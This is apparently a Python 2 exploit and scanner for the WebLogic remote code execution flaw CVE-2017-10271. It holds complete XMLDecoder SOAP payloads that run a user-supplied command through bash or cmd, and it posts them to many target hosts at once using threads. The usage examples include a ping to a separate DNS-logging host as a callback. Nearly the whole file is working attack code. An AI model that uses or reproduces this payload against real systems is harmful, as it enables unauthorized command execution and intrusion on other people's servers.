import sys, getopt
import re
import requests,traceback
import threading
from time import ctime


lock = threading.Lock()

proxies = {"http":"http://127.0.0.1:8080"}
headers = {'Content-type': 'text/xml'}
uri = '/wls-wsat/CoordinatorPortType'
linux_poc = '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
	<soapenv:Header>
		<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
			<java version="1.8.0_131" class="java.beans.XMLDecoder">
				<void class="java.lang.ProcessBuilder">
					<array class="java.lang.String" length="3">
						<void index="0">
							<string>/bin/bash</string>
						</void>
						<void index="1">
							<string>-c</string>
						</void>
						<void index="2">
							<string>%s</string>
						</void>
					</array>
					<void method="start"/>
				</void>
			</java>
		</work:WorkContext>
	</soapenv:Header>
<soapenv:Body/>
</soapenv:Envelope>
'''
win_poc = '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
	<soapenv:Header>
		<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
			<java version="1.8.0_131" class="java.beans.XMLDecoder">
				<void class="java.lang.ProcessBuilder">
					<array class="java.lang.String" length="3">
						<void index="0">
							<string>cmd</string>
						</void>
						<void index="1">
							<string>/c</string>
						</void>
						<void index="2">
							<string>%s</string>
						</void>
					</array>
					<void method="start"/>
				</void>
			</java>
		</work:WorkContext>
	</soapenv:Header>
<soapenv:Body/>
</soapenv:Envelope>
'''


def scan(url='zzz.me',ports=['80'],cmd='echo test',i=-1):

    linux_poc2 = linux_poc % cmd
    win_poc2 = win_poc % cmd
    url = 'http://'+url
    try:
        r = requests.head(url,timeout = 3)
        if r.status_code != 200:
            return
    except requests.ReadTimeout:
        pass
    except requests.ConnectionError:
        pass
    except Exception,e:
        lock.acquire()
        print i,'\tOops\t',repr(e).split('(')[0],url
        lock.release()
    for port in ports:
        url2 = url+':'+port+uri
        try:
            r1 = requests.post(url2,headers=headers,data=linux_poc2,timeout=3)
            r2 = requests.post(url2,headers=headers,data=win_poc2,timeout=3)
            if r1.status_code == r2.status_code == 500:
                lock.acquire()
                print i,'seems vul\t',url2
                lock.release()
        except requests.ReadTimeout:
            pass
        except requests.ConnectionError:
            pass
        except Exception,e:
            lock.acquire()
            print i,'\tOops\t',+repr(e).split('(')[0],url2
            lock.release()

if __name__ == '__main__':
    print 'Auther: zzz'
    print 'python 2.7.14'
    print 'for fun'
    if len(sys.argv)<3:
        print '''
Usage: 
python scan-weblogic_rce-cve-2017-10271.py -u zzz.me
python scan-weblogic_rce-cve-2017-10271.py -u zzz.me -p 80,7001
python scan-weblogic_rce-cve-2017-10271.py -f url.txt
python scan-weblogic_rce-cve-2017-10271.py -f url.txt -p 80,7001
python scan-weblogic_rce-cve-2017-10271.py -u zzz.me -c "ping dnslog.zzz.me" -p 80,7001
python scan-weblogic_rce-cve-2017-10271.py -u "zzz.me,d.zzz.me" -f "url.txt" -c "ping dnslog.zzz.me" -p 80,7001
'''
        sys.exit(0)
        
    opts, args = getopt.getopt(sys.argv[1:], "u:f:c:p:")
    urls = []
    f = ''
    ports = []
    cmd = ''
    for op,value in opts:
        if op == '-u':
            for url in re.split(' |,',value):
                urls.append(url)
        if op == '-f':
            f = value
        if op == '-c':
            cmd = value
        if op == '-p':
            for port in re.split(' |,',value):
                ports.append(port)
                
    if f != '':
        s = open(f,'r').read()
        for url in s.split():
            urls.append(url)
    print 'start at ' + ctime()
    i = 0
    threads = []
    for url in urls:
        i += 1
        t = threading.Thread(target=scan,args=(url,ports,cmd,i))
        threads.append(t)
    ii = 0
    while ii<i :
        threads[ii].start()
        ii += 1
    ii = 0
    while ii<i :
        threads[ii].join()
        ii += 1
    print 'done ' + ctime()
    
